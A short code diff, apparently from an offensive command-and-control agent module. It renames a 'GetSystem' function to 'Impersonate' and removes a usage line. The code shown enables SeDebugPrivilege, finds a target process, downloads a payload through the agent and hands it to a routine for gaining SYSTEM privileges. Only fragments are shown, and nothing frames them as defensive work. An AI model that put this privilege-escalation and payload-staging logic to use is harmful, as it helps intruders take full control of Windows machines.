@@ -202,7 +202,7 @@ def find_process_by_name(exe_name_target):
     return target_pid
 
 
-def GetSystem(payload_bytes, target_pid=0):
+def Impersonate(payload_bytes, target_pid=0):
     print("[*] GetSystem: Enabling SeDebugPrivilege...")
     err = SePrivEnable("SeDebugPrivilege")
     if err != None:
@@ -231,7 +231,6 @@ def main(*args):
     checksum = args[2]
 
     if not payload_file:
-        print("[-] Usage: get_system [hosting_process] <payload_file>")
         return "Fail: payload_file parameter is required"
 
     print("[*] Fetching payload %s via agent.fetch_file..." % payload_file)
@@ -247,4 +246,4 @@ def main(*args):
         "[+] Downloaded %d bytes of payload data for %s"
         % (len(payload_bytes), payload_file)
     )
-    return GetSystem(payload_bytes, pid)
+    return Impersonate(payload_bytes, pid)
